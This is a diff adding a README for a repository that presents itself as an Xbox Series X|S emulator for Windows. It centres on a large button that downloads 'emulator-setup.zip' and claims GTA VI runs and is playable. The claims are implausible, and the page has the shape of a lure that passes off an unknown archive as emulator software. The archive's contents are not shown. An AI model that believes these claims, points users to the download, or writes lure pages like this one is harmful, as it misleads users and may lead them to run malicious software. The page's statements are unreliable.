@@ -1,0 +1,19 @@
+<p align="center">
+  <img src="xbox-pc-research-banner.svg" alt="Xbox Series X|S Emulator for PC" width="100%">
+</p>
+
+<p align="center">
+  <a href="https://raw.githubusercontent.com/WaLChel/xbox-series-pc/main/emulator-setup.zip"><img src="https://img.shields.io/badge/⬇%20DOWNLOAD-EMULATOR%20ZIP-36C979?style=for-the-badge&logo=github&logoColor=white" alt="Download emulator ZIP"></a>
+</p>
+
+# Xbox Series X|S Emulator for PC
+
+Experimental Windows x64 build for running Xbox Series X|S software on PC.
+
+## Download
+
+Click **Download Emulator ZIP** above. It downloads `emulator-setup.zip` from this repository. The archive is included in the repository root; keep its filename unchanged so the button continues to work.
+
+## GTA VI status
+
+The project maintainer reports that GTA VI launches and is playable on the current development build. Compatibility may depend on the game build and PC hardware. Add tested build details, hardware, and known issues as they are confirmed.
